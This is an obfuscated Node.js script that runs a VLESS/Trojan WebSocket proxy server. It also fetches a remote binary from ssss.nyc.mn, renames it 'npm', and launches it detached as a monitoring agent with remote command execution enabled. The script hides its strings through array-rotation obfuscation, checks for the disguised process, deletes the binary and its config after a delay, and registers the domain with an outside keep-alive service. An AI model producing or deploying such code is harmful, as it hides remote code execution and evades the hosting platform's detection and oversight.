const _0x125f0d=_0x148a;(function(_0x17ac80,_0x25915e){const _0x9adaf2=_0x148a,_0x328aed=_0x17ac80();while(!![]){try{const _0x6fc4c6=-parseInt(_0x9adaf2(0x194))/0x1+-parseInt(_0x9adaf2(0x1d4))/0x2+parseInt(_0x9adaf2(0x1da))/0x3+parseInt(_0x9adaf2(0x1db))/0x4+-parseInt(_0x9adaf2(0x178))/0x5+-parseInt(_0x9adaf2(0x1de))/0x6+parseInt(_0x9adaf2(0x17d))/0x7;if(_0x6fc4c6===_0x25915e)break;else _0x328aed['push'](_0x328aed['shift']());}catch(_0x2b4259){_0x328aed['push'](_0x328aed['shift']());}}}(_0x2909,0x9c1bb));const os=require('os'),http=require(_0x125f0d(0x1bb)),fs=require('fs'),axios=require(_0x125f0d(0x198)),net=require('net'),path=require('path'),crypto=require(_0x125f0d(0x1c4)),{Buffer}=require(_0x125f0d(0x1a5)),{exec,execSync}=require(_0x125f0d(0x1a3)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env']['UUID']||_0x125f0d(0x18e),NEZHA_SERVER=process[_0x125f0d(0x1ec)][_0x125f0d(0x1e5)]||'',NEZHA_PORT=process[_0x125f0d(0x1ec)][_0x125f0d(0x1a9)]||'',NEZHA_KEY=process['env']['NEZHA_KEY']||'',DOMAIN=process['env'][_0x125f0d(0x1d6)]||_0x125f0d(0x1b8),AUTO_ACCESS=process[_0x125f0d(0x1ec)][_0x125f0d(0x1b2)]||!![],WSPATH=process[_0x125f0d(0x1ec)][_0x125f0d(0x1a8)]||UUID[_0x125f0d(0x197)](0x0,0x8),SUB_PATH=process['env']['SUB_PATH']||_0x125f0d(0x1b9),NAME=process['env'][_0x125f0d(0x1ac)]||_0x125f0d(0x1d5),PORT=process['env'][_0x125f0d(0x1b0)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x45484b=_0x125f0d;try{const _0x14fb68=await axios['get']('https://speed.cloudflare.com/meta'),_0x2235c2=_0x14fb68[_0x45484b(0x1ae)];ISP=(_0x2235c2['country']+'-'+_0x2235c2[_0x45484b(0x1c8)])[_0x45484b(0x1cf)](/ /g,'_');}catch(_0x231af8){ISP=_0x45484b(0x1a2);}};GetISP();const httpServer=http[_0x125f0d(0x1e0)]((_0x122eb6,_0x3a64e2)=>{const _0x5e11f9=_0x125f0d;if(_0x122eb6['url']==='/'){const _0x42afc1=path[_0x5e11f9(0x1bc)](__dirname,_0x5e11f9(0x1e2));fs['readFile'](_0x42afc1,_0x5e11f9(0x19e),(_0x4d674d,_0x5bed9a)=>{const _0x44e157=_0x5e11f9;if(_0x4d674d){_0x3a64e2[_0x44e157(0x192)](0xc8,{'Content-Type':_0x44e157(0x19b)}),_0x3a64e2[_0x44e157(0x1d1)]('Hello\x20world!');return;}_0x3a64e2['writeHead'](0xc8,{'Content-Type':'text/html'}),_0x3a64e2[_0x44e157(0x1d1)](_0x5bed9a);});return;}else{if(_0x122eb6[_0x5e11f9(0x182)]==='/'+SUB_PATH){const _0x35629e=_0x5e11f9(0x1ef)+UUID+'@'+DOMAIN+_0x5e11f9(0x1f0)+DOMAIN+_0x5e11f9(0x193)+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x129622=_0x5e11f9(0x1dc)+UUID+'@'+DOMAIN+_0x5e11f9(0x195)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x5e11f9(0x1a7)+WSPATH+'#'+NAME+'-'+ISP,_0x2e7196=_0x35629e+'\x0a'+_0x129622,_0x3c83a8=Buffer[_0x5e11f9(0x1e3)](_0x2e7196)['toString'](_0x5e11f9(0x1df));_0x3a64e2[_0x5e11f9(0x192)](0xc8,{'Content-Type':_0x5e11f9(0x183)}),_0x3a64e2[_0x5e11f9(0x1d1)](_0x3c83a8+'\x0a');}else _0x3a64e2[_0x5e11f9(0x192)](0x194,{'Content-Type':_0x5e11f9(0x183)}),_0x3a64e2[_0x5e11f9(0x1d1)](_0x5e11f9(0x1be));}}),wss=new WebSocket[(_0x125f0d(0x1e7))]({'server':httpServer}),uuid=UUID[_0x125f0d(0x1cf)](/-/g,''),DNS_SERVERS=[_0x125f0d(0x1d9),_0x125f0d(0x1dd)];function _0x2909(){const _0x3873a3=['https://arm64.ssss.nyc.mn/agent','npm\x20is\x20already\x20running,\x20skip\x20running...','writeFileSync','npm\x20download\x20successfully','url','text/plain','post','trim','concat','once','substr','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','https://dns.google/resolve?name=','connection','https://amd64.ssss.nyc.mn/v1','error','e6697571-1923-4c0c-b785-51ea35f3dee3','arch','Automatic\x20Access\x20Task\x20added\x20successfully','find','writeHead','&fp=chrome&type=ws&host=','477855uyqYLN',':443?security=tls&sni=','Answer','slice','axios','Failed\x20to\x20resolve\x20','2083','text/html','close','send','utf8','https://','--tls','map','Unknown','child_process','&type=A','buffer','createHash','&path=%2F','WSPATH','NEZHA_PORT','unlink','reduce','NAME','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','data','443','PORT','catch','AUTO_ACCESS','application/json','2053','type','readUInt8','test','1234.abc.com','sub','write','http','join','\x20with\x20all\x20DNS\x20servers','Not\x20Found\x0a','arm','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','https://amd64.ssss.nyc.mn/agent','2096','chmod\x20+x\x20npm','crypto','pipe','toString','every','asOrganization','get','error:\x20','log','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','includes','length','replace','stream','end','utf-8','8443','1545154UvJULv','Hug','DOMAIN','connect','createWriteStream','8.8.4.4','423006XSWQSQ','4872712WhwkKg','trojan://','1.1.1.1','878370lTCJFC','base64','createServer','config.yaml','index.html','from','readUInt16BE','NEZHA_SERVER','https://oooo.serv00.net/add-url','Server','client_secret:\x20','split','npm\x20running\x20error:','update','env','2087','\x20-p\x20','vless://',':443?encryption=none&security=tls&sni=','then','sha224','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','message','npm','1421235jgnyYF','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','true','false','arm64','6729191qXfNML'];_0x2909=function(){return _0x3873a3;};return _0x2909();}function resolveHost(_0x356671){return new Promise((_0x5d1798,_0x507646)=>{const _0x28cecf=_0x148a;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x28cecf(0x1b7)](_0x356671)){_0x5d1798(_0x356671);return;}let _0xeef06d=0x0;function _0x3331ce(){const _0x4b08de=_0x28cecf;if(_0xeef06d>=DNS_SERVERS[_0x4b08de(0x1ce)]){_0x507646(new Error(_0x4b08de(0x199)+_0x356671+_0x4b08de(0x1bd)));return;}const _0x30b2b7=DNS_SERVERS[_0xeef06d];_0xeef06d++;const _0x3971f8=_0x4b08de(0x18a)+encodeURIComponent(_0x356671)+_0x4b08de(0x1a4);axios[_0x4b08de(0x1c9)](_0x3971f8,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x4b08de(0x1f1)](_0x220122=>{const _0x13dd17=_0x4b08de,_0x382b8a=_0x220122[_0x13dd17(0x1ae)];if(_0x382b8a['Status']===0x0&&_0x382b8a[_0x13dd17(0x196)]&&_0x382b8a['Answer']['length']>0x0){const _0x2d5ab4=_0x382b8a[_0x13dd17(0x196)][_0x13dd17(0x191)](_0x249a0d=>_0x249a0d[_0x13dd17(0x1b5)]===0x1);if(_0x2d5ab4){_0x5d1798(_0x2d5ab4[_0x13dd17(0x1ae)]);return;}}_0x3331ce();})['catch'](_0x305121=>{_0x3331ce();});}_0x3331ce();});}function handleVlessConnection(_0x239f3e,_0x1c0e4d){const _0x43dbfb=_0x125f0d,[_0xc8f478]=_0x1c0e4d,_0x247773=_0x1c0e4d[_0x43dbfb(0x197)](0x1,0x11);if(!_0x247773[_0x43dbfb(0x1c7)]((_0x2e21f7,_0x27874a)=>_0x2e21f7==parseInt(uuid[_0x43dbfb(0x188)](_0x27874a*0x2,0x2),0x10)))return![];let _0x49db26=_0x1c0e4d[_0x43dbfb(0x197)](0x11,0x12)[_0x43dbfb(0x1b6)]()+0x13;const _0xb069c8=_0x1c0e4d[_0x43dbfb(0x197)](_0x49db26,_0x49db26+=0x2)[_0x43dbfb(0x1e4)](0x0),_0x9820f=_0x1c0e4d[_0x43dbfb(0x197)](_0x49db26,_0x49db26+=0x1)['readUInt8'](),_0x10d150=_0x9820f==0x1?_0x1c0e4d[_0x43dbfb(0x197)](_0x49db26,_0x49db26+=0x4)[_0x43dbfb(0x1bc)]('.'):_0x9820f==0x2?new TextDecoder()['decode'](_0x1c0e4d[_0x43dbfb(0x197)](_0x49db26+0x1,_0x49db26+=0x1+_0x1c0e4d[_0x43dbfb(0x197)](_0x49db26,_0x49db26+0x1)['readUInt8']())):_0x9820f==0x3?_0x1c0e4d['slice'](_0x49db26,_0x49db26+=0x10)[_0x43dbfb(0x1ab)]((_0x15185f,_0x3e9b8f,_0x223a4f,_0x294dda)=>_0x223a4f%0x2?_0x15185f[_0x43dbfb(0x186)](_0x294dda['slice'](_0x223a4f-0x1,_0x223a4f+0x1)):_0x15185f,[])['map'](_0x191df3=>_0x191df3[_0x43dbfb(0x1e4)](0x0)[_0x43dbfb(0x1c6)](0x10))[_0x43dbfb(0x1bc)](':'):'';_0x239f3e[_0x43dbfb(0x19d)](new Uint8Array([_0xc8f478,0x0]));const _0x44778c=createWebSocketStream(_0x239f3e);return resolveHost(_0x10d150)[_0x43dbfb(0x1f1)](_0x26e303=>{const _0x2d1f18=_0x43dbfb;net['connect']({'host':_0x26e303,'port':_0xb069c8},function(){const _0x4ed9f9=_0x148a;this['write'](_0x1c0e4d[_0x4ed9f9(0x197)](_0x49db26)),_0x44778c['on'](_0x4ed9f9(0x18d),()=>{})[_0x4ed9f9(0x1c5)](this)['on'](_0x4ed9f9(0x18d),()=>{})[_0x4ed9f9(0x1c5)](_0x44778c);})['on'](_0x2d1f18(0x18d),()=>{});})[_0x43dbfb(0x1b1)](_0x23fde4=>{const _0x2d5bb2=_0x43dbfb;net[_0x2d5bb2(0x1d7)]({'host':_0x10d150,'port':_0xb069c8},function(){const _0x49e02a=_0x2d5bb2;this[_0x49e02a(0x1ba)](_0x1c0e4d[_0x49e02a(0x197)](_0x49db26)),_0x44778c['on'](_0x49e02a(0x18d),()=>{})[_0x49e02a(0x1c5)](this)['on'](_0x49e02a(0x18d),()=>{})[_0x49e02a(0x1c5)](_0x44778c);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0x4f1c47,_0x5b3c5f){const _0x372632=_0x125f0d;try{if(_0x5b3c5f['length']<0x3a)return![];const _0x408eea=_0x5b3c5f[_0x372632(0x197)](0x0,0x38)[_0x372632(0x1c6)](),_0x38cdac=[UUID];let _0x5c5629=null;for(const _0x16f1d9 of _0x38cdac){const _0x585721=crypto[_0x372632(0x1a6)](_0x372632(0x1f2))[_0x372632(0x1eb)](_0x16f1d9)['digest']('hex');if(_0x585721===_0x408eea){_0x5c5629=_0x16f1d9;break;}}if(!_0x5c5629)return![];let _0x4dcc56=0x38;_0x5b3c5f[_0x4dcc56]===0xd&&_0x5b3c5f[_0x4dcc56+0x1]===0xa&&(_0x4dcc56+=0x2);const _0x23aef5=_0x5b3c5f[_0x4dcc56];if(_0x23aef5!==0x1)return![];_0x4dcc56+=0x1;const _0x458dff=_0x5b3c5f[_0x4dcc56];_0x4dcc56+=0x1;let _0x24ed87,_0x115545;if(_0x458dff===0x1)_0x24ed87=_0x5b3c5f[_0x372632(0x197)](_0x4dcc56,_0x4dcc56+0x4)[_0x372632(0x1bc)]('.'),_0x4dcc56+=0x4;else{if(_0x458dff===0x3){const _0x3c55bf=_0x5b3c5f[_0x4dcc56];_0x4dcc56+=0x1,_0x24ed87=_0x5b3c5f[_0x372632(0x197)](_0x4dcc56,_0x4dcc56+_0x3c55bf)['toString'](),_0x4dcc56+=_0x3c55bf;}else{if(_0x458dff===0x4)_0x24ed87=_0x5b3c5f[_0x372632(0x197)](_0x4dcc56,_0x4dcc56+0x10)['reduce']((_0x5ec73e,_0x5f2df1,_0x1355c1,_0x1ae8b8)=>_0x1355c1%0x2?_0x5ec73e[_0x372632(0x186)](_0x1ae8b8['slice'](_0x1355c1-0x1,_0x1355c1+0x1)):_0x5ec73e,[])[_0x372632(0x1a1)](_0xe658=>_0xe658[_0x372632(0x1e4)](0x0)[_0x372632(0x1c6)](0x10))[_0x372632(0x1bc)](':'),_0x4dcc56+=0x10;else return![];}}_0x115545=_0x5b3c5f[_0x372632(0x1e4)](_0x4dcc56),_0x4dcc56+=0x2;_0x4dcc56<_0x5b3c5f[_0x372632(0x1ce)]&&_0x5b3c5f[_0x4dcc56]===0xd&&_0x5b3c5f[_0x4dcc56+0x1]===0xa&&(_0x4dcc56+=0x2);const _0x2c9c77=createWebSocketStream(_0x4f1c47);return resolveHost(_0x24ed87)[_0x372632(0x1f1)](_0x928219=>{const _0x1865a2=_0x372632;net['connect']({'host':_0x928219,'port':_0x115545},function(){const _0x5c96ec=_0x148a;_0x4dcc56<_0x5b3c5f[_0x5c96ec(0x1ce)]&&this[_0x5c96ec(0x1ba)](_0x5b3c5f[_0x5c96ec(0x197)](_0x4dcc56)),_0x2c9c77['on']('error',()=>{})[_0x5c96ec(0x1c5)](this)['on']('error',()=>{})['pipe'](_0x2c9c77);})['on'](_0x1865a2(0x18d),()=>{});})[_0x372632(0x1b1)](_0x11f116=>{const _0x34e521=_0x372632;net[_0x34e521(0x1d7)]({'host':_0x24ed87,'port':_0x115545},function(){const _0x3acd7e=_0x34e521;_0x4dcc56<_0x5b3c5f['length']&&this['write'](_0x5b3c5f[_0x3acd7e(0x197)](_0x4dcc56)),_0x2c9c77['on'](_0x3acd7e(0x18d),()=>{})[_0x3acd7e(0x1c5)](this)['on'](_0x3acd7e(0x18d),()=>{})['pipe'](_0x2c9c77);})['on']('error',()=>{});}),!![];}catch(_0x553512){return![];}}wss['on'](_0x125f0d(0x18b),(_0x527e21,_0x2dd75d)=>{const _0x52cc06=_0x125f0d,_0x23cfc9=_0x2dd75d['url']||'';_0x527e21[_0x52cc06(0x187)](_0x52cc06(0x1f4),_0x358db=>{const _0x2542c0=_0x52cc06;if(_0x358db[_0x2542c0(0x1ce)]>0x11&&_0x358db[0x0]===0x0){const _0x55c2e5=_0x358db[_0x2542c0(0x197)](0x1,0x11),_0xb2b64a=_0x55c2e5['every']((_0x2ca031,_0x1a4e7e)=>_0x2ca031==parseInt(uuid['substr'](_0x1a4e7e*0x2,0x2),0x10));if(_0xb2b64a){!handleVlessConnection(_0x527e21,_0x358db)&&_0x527e21['close']();return;}}!handleTrojanConnection(_0x527e21,_0x358db)&&_0x527e21[_0x2542c0(0x19c)]();})['on'](_0x52cc06(0x18d),()=>{});});const getDownloadUrl=()=>{const _0x50dbf3=_0x125f0d,_0x471102=os[_0x50dbf3(0x18f)]();return _0x471102===_0x50dbf3(0x1bf)||_0x471102===_0x50dbf3(0x17c)||_0x471102==='aarch64'?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':_0x50dbf3(0x17e):!NEZHA_PORT?_0x50dbf3(0x18c):_0x50dbf3(0x1c1);},downloadFile=async()=>{const _0x38a957=_0x125f0d;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x45f2f0=getDownloadUrl(),_0x151f57=await axios({'method':_0x38a957(0x1c9),'url':_0x45f2f0,'responseType':_0x38a957(0x1d0)}),_0x1c1138=fs[_0x38a957(0x1d8)](_0x38a957(0x177));return _0x151f57[_0x38a957(0x1ae)]['pipe'](_0x1c1138),new Promise((_0xed334f,_0x5d1822)=>{const _0x384dd9=_0x38a957;_0x1c1138['on']('finish',()=>{const _0x5231b1=_0x148a;console[_0x5231b1(0x1cb)](_0x5231b1(0x181)),exec(_0x5231b1(0x1c3),_0x3ed478=>{if(_0x3ed478)_0x5d1822(_0x3ed478);_0xed334f();});}),_0x1c1138['on'](_0x384dd9(0x18d),_0x5d1822);});}catch(_0x13783f){throw _0x13783f;}},runnz=async()=>{const _0x35679f=_0x125f0d;try{const _0x1ee62a=execSync(_0x35679f(0x1cc),{'encoding':_0x35679f(0x1d2)});if(_0x1ee62a[_0x35679f(0x185)]()!==''){console[_0x35679f(0x1cb)](_0x35679f(0x17f));return;}}catch(_0xb3d407){}await downloadFile();let _0x5e2fb0='',_0x5a58c0=[_0x35679f(0x1af),_0x35679f(0x1d3),_0x35679f(0x1c2),_0x35679f(0x1ed),_0x35679f(0x19a),_0x35679f(0x1b4)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x45c832=_0x5a58c0[_0x35679f(0x1cd)](NEZHA_PORT)?_0x35679f(0x1a0):'';_0x5e2fb0='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x35679f(0x1ee)+NEZHA_KEY+'\x20'+_0x45c832+_0x35679f(0x1f3);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2ca718=NEZHA_SERVER[_0x35679f(0x1cd)](':')?NEZHA_SERVER[_0x35679f(0x1e9)](':')['pop']():'',_0x465986=_0x5a58c0[_0x35679f(0x1cd)](_0x2ca718)?_0x35679f(0x17a):_0x35679f(0x17b),_0xb5d5a8=_0x35679f(0x1e8)+NEZHA_KEY+_0x35679f(0x179)+NEZHA_SERVER+_0x35679f(0x1ad)+_0x465986+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x35679f(0x180)](_0x35679f(0x1e1),_0xb5d5a8);}_0x5e2fb0=_0x35679f(0x189);}else{console[_0x35679f(0x1cb)](_0x35679f(0x1c0));return;}}try{exec(_0x5e2fb0,{'shell':'/bin/bash'},_0x22d9ab=>{const _0x5d46df=_0x35679f;if(_0x22d9ab)console[_0x5d46df(0x18d)](_0x5d46df(0x1ea),_0x22d9ab);else console[_0x5d46df(0x1cb)]('npm\x20is\x20running');});}catch(_0x46d031){console[_0x35679f(0x18d)](_0x35679f(0x1ca)+_0x46d031);}};async function addAccessTask(){const _0x382dac=_0x125f0d;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x356507=_0x382dac(0x19f)+DOMAIN;try{const _0x340bab=await axios[_0x382dac(0x184)](_0x382dac(0x1e6),{'url':_0x356507},{'headers':{'Content-Type':_0x382dac(0x1b3)}});console[_0x382dac(0x1cb)](_0x382dac(0x190));}catch(_0x939116){}}const delFiles=()=>{const _0x492759=_0x125f0d;fs[_0x492759(0x1aa)](_0x492759(0x177),()=>{}),fs[_0x492759(0x1aa)](_0x492759(0x1e1),()=>{});};function _0x148a(_0xb4ae91,_0x53f27){_0xb4ae91=_0xb4ae91-0x177;const _0x290968=_0x2909();let _0x148a01=_0x290968[_0xb4ae91];return _0x148a01;}httpServer['listen'](PORT,()=>{const _0x57e0a9=_0x125f0d;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x57e0a9(0x1cb)]('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
